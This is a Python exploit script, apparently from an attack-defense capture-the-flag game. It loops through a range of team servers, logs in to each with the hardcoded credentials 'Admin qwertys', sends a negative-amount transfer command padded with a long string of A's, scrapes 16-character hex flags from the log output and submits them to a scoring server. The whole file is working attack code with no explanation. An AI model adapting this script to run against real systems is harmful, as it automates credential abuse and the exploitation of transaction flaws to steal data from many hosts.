#!/usr/bin/python
import re
import telnetlib
import time
from socket import create_connection
remove = [2,19,37,3,5,6,48,4,8,9,10,26,51,81,105,102,86,87,88,89,90,100,74]
serv_list= range(0,116)[::-1]
def submit(flags):
    t=telnetlib.Telnet("10.23.0.1",1)
    t.get_socket().recv(1024)
    for flag in flags:
        t.write(flag+"\n")
        print flag
        print t.get_socket().recv(1024).strip()
    t.close()
    time.sleep(1)

def main():
    for i in serv_list:
      try:
        if i in remove:
            raise Exception("pass..")
        print i
        t = telnetlib.Telnet("10.22.%s.1"%i, 3270,timeout=1)
        s = t.get_socket()
        s.recv(1024)
        s.send("LOGIN Admin qwertys\n")
        t.read_until(">")
        s.recv(1024)
        s.send("TRANS -10000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1\n")
        print t.read_until(">")
        s.send("LOG 1\n")
        t.read_until("->")
        data = s.recv(1024)
        print data
        lst = re.findall(r"([a-f\d]{16})",data)
        print lst
        submit(lst)
      except:
            pass
if __name__=="__main__":
    while 1:
        main()
